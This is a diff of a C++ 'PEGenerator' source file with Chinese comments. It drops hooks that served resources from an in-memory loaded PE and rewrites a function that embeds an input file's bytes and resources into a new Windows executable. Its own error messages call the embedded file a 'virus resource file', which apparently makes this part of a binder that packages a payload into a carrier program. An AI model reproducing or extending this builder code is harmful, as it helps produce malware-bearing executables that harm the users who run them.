@@ -1,44 +1,5 @@
 #include "PEGenerator.h"
 
-HMEMORYMODULE g_mem_pe = NULL;
-FARPROC OriginalFindResource = NULL;
-FARPROC OriginalLoadResource = NULL;
-
-// 自定义的 FindResource 函数
-HMODULE WINAPI CustomFindResource(HMODULE hModule, LPCTSTR lpName, LPCTSTR lpType) {
-    if (!g_mem_pe || !OriginalFindResource) {
-        return (HMODULE)FindResource(hModule, lpName, lpType);
-    }
-
-    // 自定义逻辑，查找内存加载的资源
-    // 若找到资源则返回其句柄
-    HMODULE customResource = (HMODULE)MemoryFindResource(g_mem_pe, lpName, lpType);
-    if (customResource != NULL) {
-        return customResource;
-    }
-
-    // 否则调用原始 FindResource
-    return ((HMODULE(WINAPI*)(HMODULE, LPCTSTR, LPCTSTR))OriginalFindResource)(hModule, lpName, lpType);
-}
-
-// 自定义的 LoadResource 函数
-HGLOBAL WINAPI CustomLoadResource(HMODULE hModule, HRSRC hResInfo) {
-    if (!g_mem_pe || !OriginalLoadResource) {
-        return LoadResource(hModule, hResInfo);
-    }
-
-    // 自定义逻辑，加载内存中的资源数据
-    HGLOBAL customData = MemoryLoadResource(g_mem_pe, hResInfo);
-    
-    if (customData != NULL) {
-        return customData;
-    }
-
-    // 否则调用原始 LoadResource
-    return ((HGLOBAL(WINAPI*)(HMODULE, HRSRC))OriginalLoadResource)(hModule, hResInfo);
-}
-
-
 // 添加文件及资源到新的可执行文件
 BOOL AddFileToResource(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newExePath) {
     WCHAR tempFilePath[MAX_PATH];
@@ -176,28 +137,56 @@ BOOL AddFileToResource32(LPCWSTR exePath, LPCWSTR resourceFilePath, LPCWSTR newE
         DeleteFile(tempFilePath); // 删除临时文件
         return FALSE;
     }
-
-    // 加载资源文件
-    HMODULE hResourceModule = LoadLibraryEx(resourceFilePath, NULL, LOAD_LIBRARY_AS_DATAFILE);
-    if (!hResourceModule) {
-        MessageBox(NULL, L"Failed to load resource file.", L"generator", MB_OK);
+    // 打开要添加到资源的文件
+    std::ifstream file(resourceFilePath, std::ios::binary);
+    if (!file.is_open()) {
+        MessageBox(NULL, L"Failed to open the input file.", L"generator", MB_OK);
         EndUpdateResource(hUpdate, TRUE);
         DeleteFile(tempFilePath); // 删除临时文件
         return FALSE;
     }
 
-    // 遍历并更新 resourceFilePath 中的所有资源到新的可执行文件
-    ResourceUpdateData32 updateData = { hUpdate };
-    if (!EnumResourceTypes(hResourceModule, EnumTypesProc32, (LONG_PTR)&updateData)) {
-        MessageBox(NULL, L"Failed to enumerate resources.", L"generator", MB_OK);
+    // 读取文件内容到内存
+    file.seekg(0, std::ios::end);
+    size_t fileSize = file.tellg();
+    file.seekg(0, std::ios::beg);
+
+    char* buffer = new char[fileSize];
+    file.read(buffer, fileSize);
+    file.close();
+
+    // 将文件内容更新到资源中
+    if (!UpdateResource(hUpdate, RT_RCDATA, MAKEINTRESOURCE(IDR_BINARY_FILE), MAKELANGID(LANG_NEUTRAL, SUBLANG_NEUTRAL), buffer, fileSize)) {
+        MessageBox(NULL, L"Failed to update the resource.", L"generator", MB_OK);
+        delete[] buffer;
+        EndUpdateResource(hUpdate, TRUE);
+        DeleteFile(tempFilePath); // 删除临时文件
+        return FALSE;
+    }
+
+    delete[] buffer;
+
+
+    do {
+
+        // 加载资源文件
+        HMODULE hResourceModule = LoadLibraryEx(resourceFilePath, NULL, LOAD_LIBRARY_AS_DATAFILE);
+        if (!hResourceModule) {
+            MessageBox(NULL, L"Failed to load virus resource file.", L"generator", MB_OK);
+            break;
+        }
+
+        // 遍历并更新 resourceFilePath 中的所有资源到新的可执行文件
+        ResourceUpdateData32 updateData = { hUpdate };
+        if (!EnumResourceTypes(hResourceModule, EnumTypesProc32, (LONG_PTR)&updateData)) {
+            MessageBox(NULL, L"Failed to enumerate virus resources.", L"generator", MB_OK);
+            FreeLibrary(hResourceModule);
+            break;
+        }
+
+        // 释放资源模块
         FreeLibrary(hResourceModule);
-        EndUpdateResource(hUpdate, TRUE);
-        DeleteFile(tempFilePath); // 删除临时文件
-        return FALSE;
-    }
-
-    // 释放资源模块
-    FreeLibrary(hResourceModule);
+    } while (0);
 
     // 完成资源更新
     if (!EndUpdateResource(hUpdate, FALSE)) {
